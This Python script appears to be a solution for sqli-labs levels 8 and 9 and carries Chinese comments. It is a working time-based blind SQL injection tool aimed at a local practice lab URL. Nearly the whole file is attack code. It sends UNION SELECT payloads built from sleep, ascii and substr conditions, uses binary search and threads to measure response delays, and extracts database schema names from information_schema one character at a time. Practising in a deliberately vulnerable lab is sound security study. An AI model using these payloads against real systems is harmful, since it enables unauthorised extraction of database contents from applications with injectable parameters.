# 第8题延时注入
# 第9题和第八题一样不过没了回显

import requests
import time
import threading
def Binary_Sreach_Number(start,end,headStr,tallStr,sign=False):
    if end-start<=1:
        if Test_Injection_TrueOrFalse(headStr+">"+str(start)+tallStr,sign=sign):
            return end
        else:
            return start
    mid=int((end+start)/2)
    if Test_Injection_TrueOrFalse(headStr+">"+str(mid)+tallStr,sign=sign):
        return Binary_Sreach_Number(int((end+start)/2),end,headStr,tallStr)
    else:
        return Binary_Sreach_Number(start,int((end+start)/2),headStr,tallStr)

def guessMaxValue(headStr,tallStr):

    j = 1
    l = 1
    while True:
        if not Test_Injection_TrueOrFalse(headStr+">"+str(l)+tallStr):
            j = l
            l = j * 2
        else:
            break
    return j,l


def Test_Injection_TrueOrFalse(injectionSQL,sign=False):
    if sign:
        print(injection_URL_head+injectionSQL+injection_URL_tail)
    start_time=time.time()
    requests.get(url=injection_URL_head+injectionSQL+injection_URL_tail)
    end_time=time.time()
    # print(end_time-start_time)
    return (end_time-start_time)>max_time+1

def StringGet(SN,Current_Number):
    tLisk[SN]=chr(Binary_Sreach_Number(65,122,
                                   "if(ascii(substr(k.ss,"+str(SN+1)+",1))",
                                   ",sleep("+str(max_time+2)+"),0) from (select schema_name ss from information_schema.schemata limit "+str(Current_Number)+",1) k",
                                   sign=True))

if __name__ == "__main__":

    ip="http://192.168.43.135/sqli-labs-master/sqli-labs-master/Less-5?id=-1' union select if(ascii(substr(database(),1,1))>115,0,sleep(5))--+"
    read_ip="http://192.168.43.135/sqli-labs-master/sqli-labs-master/Less-5?id=1"
    max_time=0

    get_len_ip="http://192.168.43.135/sqli-labs-master/sqli-labs-master/Less-5?id=-1' union select 1,2,if(count(database())>1,0,sleep(5))--+"
    injection_URL_head="http://192.168.43.135/sqli-labs-master/sqli-labs-master/Less-5?id=-1' union select 1,2,"
    injection_URL_tail="--+"
    #以十次为基准来计算访问最大延时
    for i in range(10):
        start_time = time.time()
        read_response = requests.get(url=read_ip)
        end_time = time.time()
        j = (end_time - start_time)
        print(j)
        if j > max_time:
            max_time = j
    print(max_time)
    LB,RB=guessMaxValue("count(schema_name) ll  from information_schema.schemata having sleep(if(ll",",0,"+str(max_time+2)+"))")
    print("LB:"+str(LB),"RB:"+str(RB))
    l=Binary_Sreach_Number(LB,RB,"count(schema_name) ll  from information_schema.schemata having sleep(if(ll",","+str(max_time+2)+",0))")
    print(l)
    schema_list=[]
    # 用来存储
    tLisk=[]
    # 用来存储线程
    thrList=[]
    for i in range(l):
        # 如果采用下面这种注入语句他会先比对所有的数据然后再运行limit,所以只要有一个满足了那么就会sleep,所以我们要用子查询进行查询出来
        # LB, RB = guessMaxValue("if(length(schema_name)",
        #                        ",0,sleep(" + str(max_time + 2) + "))   from information_schema.schemata limit " + str(
        #                            i) + ",1")
        LB, RB = guessMaxValue("if(length(k.ss)",
                               ",0,sleep(" + str(max_time + 2) + "))   from (select schema_name ss from information_schema.schemata limit "+str(i)+",1) k")
        print("db: LB",LB,"db:RB",RB)

        l=Binary_Sreach_Number(LB,RB,"if(length(k.ss)",",sleep(" + str(max_time + 2) + "),0)   from (select schema_name ss from information_schema.schemata limit "+str(i)+",1) k")
        print("l:",l)
        tLisk=[kk for kk in range(l)]

        for jj in range(l):
            thr=threading.Thread(target=StringGet,args=(jj,i))
            thr.start()
            thrList.append(thr)

        for thr1 in thrList:
            thr1.join()

        print("tLisk:", tLisk)